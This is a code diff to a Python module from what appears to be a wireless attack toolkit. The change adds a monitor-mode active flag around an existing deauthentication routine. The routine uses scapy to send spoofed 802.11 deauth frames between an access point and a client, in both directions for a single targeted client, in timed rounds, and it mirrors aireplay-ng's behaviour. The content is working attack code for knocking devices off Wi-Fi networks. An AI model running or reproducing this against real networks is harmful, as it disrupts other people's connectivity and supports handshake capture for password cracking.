@@ -7,7 +7,7 @@ import time
 from scapy.config import conf
 
 from ..frames import BROADCAST, craft_deauth
-from ..radio import ensure_channel, ensure_monitor_mode, get_mode
+from ..radio import ensure_channel, ensure_monitor_mode, get_mode, set_monitor_active
 
 
 def deauth(
@@ -98,43 +98,47 @@ def deauth(
         log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- deauth frames cannot transmit")
         return 0
 
-    pkt_fwd = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate)
-    # Bidirectional when a real client is targeted (2026-08-30): the vendored
-    # aircrack-ng's own aireplay-ng -0/--deauth always sends both AP->client
-    # and client->AP for a directed target -- a frame lost in either
-    # direction alone can leave the OTHER endpoint still thinking it's
-    # associated. Meaningless for BROADCAST (there's no single client MAC to
-    # spoof as the reverse frame's source), so that case stays one-directional.
-    pkt_rev = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate, from_client=True) if client != BROADCAST else None
+    set_monitor_active(iface, True)
     try:
-        sock = conf.L2socket(iface=iface)
-    except OSError as exc:
-        log(f"deauth socket open failed: {exc}")
-        return 0
-    sent = 0
-    try:
-        for i in range(count):
-            if stop_event is not None and stop_event.is_set():
-                log(f"deauth stopped after {sent} frame(s) ({i}/{count} round(s)) -- stop requested")
-                return sent
-            try:
-                sock.send(pkt_fwd)
-                sent += 1
-                if pkt_rev is not None:
-                    sock.send(pkt_rev)
+        pkt_fwd = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate)
+        # Bidirectional when a real client is targeted (2026-08-30): the vendored
+        # aircrack-ng's own aireplay-ng -0/--deauth always sends both AP->client
+        # and client->AP for a directed target -- a frame lost in either
+        # direction alone can leave the OTHER endpoint still thinking it's
+        # associated. Meaningless for BROADCAST (there's no single client MAC to
+        # spoof as the reverse frame's source), so that case stays one-directional.
+        pkt_rev = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate, from_client=True) if client != BROADCAST else None
+        try:
+            sock = conf.L2socket(iface=iface)
+        except OSError as exc:
+            log(f"deauth socket open failed: {exc}")
+            return 0
+        sent = 0
+        try:
+            for i in range(count):
+                if stop_event is not None and stop_event.is_set():
+                    log(f"deauth stopped after {sent} frame(s) ({i}/{count} round(s)) -- stop requested")
+                    return sent
+                try:
+                    sock.send(pkt_fwd)
                     sent += 1
-            except OSError as exc:
-                log(f"deauth send failed after {sent} frame(s) ({i + 1}/{count} round(s)): {exc}")
-                return sent
-            if pkt_rev is not None:
-                log(f"deauth round {i + 1}/{count} sent (both directions): {bssid} <-> {client}")
-            else:
-                log(f"deauth frame {i + 1}/{count} sent: {bssid} -> {client}")
-            # Unconditional sleep(interval), even at 0.0 -- see
-            # auth_flood.py's note: a real syscall forces a GIL yield every
-            # frame, which a falsy-guarded skip would not.
-            if i < count - 1:
-                time.sleep(interval)
+                    if pkt_rev is not None:
+                        sock.send(pkt_rev)
+                        sent += 1
+                except OSError as exc:
+                    log(f"deauth send failed after {sent} frame(s) ({i + 1}/{count} round(s)): {exc}")
+                    return sent
+                if pkt_rev is not None:
+                    log(f"deauth round {i + 1}/{count} sent (both directions): {bssid} <-> {client}")
+                else:
+                    log(f"deauth frame {i + 1}/{count} sent: {bssid} -> {client}")
+                # Unconditional sleep(interval), even at 0.0 -- see
+                # auth_flood.py's note: a real syscall forces a GIL yield every
+                # frame, which a falsy-guarded skip would not.
+                if i < count - 1:
+                    time.sleep(interval)
+        finally:
+            sock.close()
+        return sent
     finally:
-        sock.close()
-    return sent
+        set_monitor_active(iface, False)
